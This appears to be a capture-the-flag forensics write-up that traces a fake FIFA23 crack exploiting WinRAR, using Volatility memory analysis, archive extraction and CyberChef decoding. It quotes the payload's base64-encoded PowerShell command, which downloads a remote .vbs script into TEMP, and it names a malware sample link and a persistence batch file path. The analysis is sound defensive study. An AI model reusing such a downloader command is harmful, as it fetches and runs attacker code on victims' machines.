***WinRAR 0-Day***

What is the suspected process?

Step 1:

Use the process tree to see what was launched and by what parent.

Command:
```
python3 vol.py -f ../Winny.vmem windows.pstree
```

Output:

<img width="1259" height="329" alt="image" src="https://github.com/user-attachments/assets/7f402e0f-d2ad-4249-87ab-50207d99d9c9" />

`WinRAR.exe`

We suspect that the crack had another name. Can you find the old name of that crack?

Now check command-line arguments for processes so you can see what file WinRAR opened.

Command:
```
python3 vol.py -f ../Winny.vmem windows.cmdline | grep "WinRAR.exe"
```

Output: 

<img width="1013" height="57" alt="image" src="https://github.com/user-attachments/assets/afece703-7899-4d00-9481-7bec07883ae4" />

`b6wzzawS.rar`


What is the new crack filename?

Use filescan to identify files referenced in memory.

Command: 

```
python3 vol.py -f ../Winny.vmem windows.filescan > ../filescan.txt
```

Output:

```
root@ip-172-31-2-76:~/Desktop# cat filescan.txt | grep "Downloads"
0xc402e9a4c230	\Users\Work\Downloads	216
0xc402ec3be1b0	\Users\Work\Downloads\winrar-x64-623.exe	216
0xc402ed4b0420	\Users\Work\Downloads	216
0xc402ed4b08d0	\Users\Work\Downloads	216
0xc402ed4b74a0	\Users\Work\AppData\Roaming\Microsoft\Windows\Recent\Downloads.lnk	216
0xc402eda5ad90	\Users\Work\Downloads	216
0xc402eda5bba0	\Users\Work\Downloads	216
0xc402edba1ce0	\Users\Work\Downloads	216
0xc402ee5b16e0	\Users\Work\Downloads\FIFA23CRACK.rar1	216
0xc402ee820320	\Users\Work\Downloads\desktop.ini	216
```

`FIFA23CRACK.rar`

What is the command that executed the remote request?

Next, dump the file from memory.

Make the directory :

```
mkdir ../dump
```

Command:

```
python3 vol.py -f ../Winny.vmem -o ../dump windows.dumpfiles --virtaddr 0xc402ee5b16e0
```

Output:

<img width="1271" height="113" alt="image" src="https://github.com/user-attachments/assets/325411cf-4ad1-43a1-b8c4-6d012c9605ca" />

Command:

```
strings ../dump/file.0xc402ee5b16e0.0xc402ed6e45d0.DataSectionObject.FIFA23CRACK.rar1.dat
```

Output: 

<img width="1203" height="253" alt="image" src="https://github.com/user-attachments/assets/7169ec4a-0dba-4acc-a2da-d9b39c585be4" />

Command: 

```
7z l FIFA23CRACK.rar
```

Output:

<img width="1234" height="511" alt="image" src="https://github.com/user-attachments/assets/7339ed86-dd55-47f0-92f4-65b2a8b39c1b" />

Command: 

```
7z l -slt FIFA23CRACK.rar
```

Command: 

```
7z e FIFA23CRACK.rar  -y
```

Command:

```
ls -la
```

Command: 

```
cat "ReadMe.txt .cmd."
```

Output:

<img width="1918" height="42" alt="image" src="https://github.com/user-attachments/assets/f83e0afe-46db-4892-b682-31262724991f" />

`powershell.exe -EncodedCommand SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Vsc2ZhN0VsNGEyeS9TZWNyZXRXZWFwL21haW4vU2Q0cUF4MjEudmJzJyAtT3V0RmlsZSAiJGVudjpURU1QXFNkNHFBeDIxLnZicyI=`

The external link has a username. What is it?

In cyberchef:

<img width="1540" height="628" alt="image" src="https://github.com/user-attachments/assets/8fa6ca5b-796d-45d0-a25c-0bcf7d5ff303" />

`Elsfa7El4a2y`

It seems the creator of that ransomware uploaded a file to the cloud. Can you find which domain it was downloaded from?

The github link returns a 404 and is unavaliable -> follow the hint and download the sample from MalwareBazaar:

`https://bazaar.abuse.ch/sample/0352598565fbafe39866f3c9b5964b613fd259ea12a8fe46410b5d119db97aba`

<img width="1910" height="641" alt="image" src="https://github.com/user-attachments/assets/dedae8c9-7dea-448d-b02a-13e761bef1bb" />

<img width="1542" height="694" alt="image" src="https://github.com/user-attachments/assets/6302c44d-fef2-48df-b672-5ce0530036e4" />


`download850.mediafire.com`

The attacker left the file behind in someplace to come back later for the device. What is the full location of this file?

At the bottom of the script there is a .savetofile command. 

<img width="1288" height="112" alt="image" src="https://github.com/user-attachments/assets/19e8d61d-7a16-4b97-a7cf-e4b132d11868" />

Replace all **** with x :

Reverse:

From Base64:

<img width="1536" height="632" alt="image" src="https://github.com/user-attachments/assets/d2f5d7d6-c320-4904-8b85-27991faef099" />

`c:\windows\temp\B4cKL4T3R.bat`















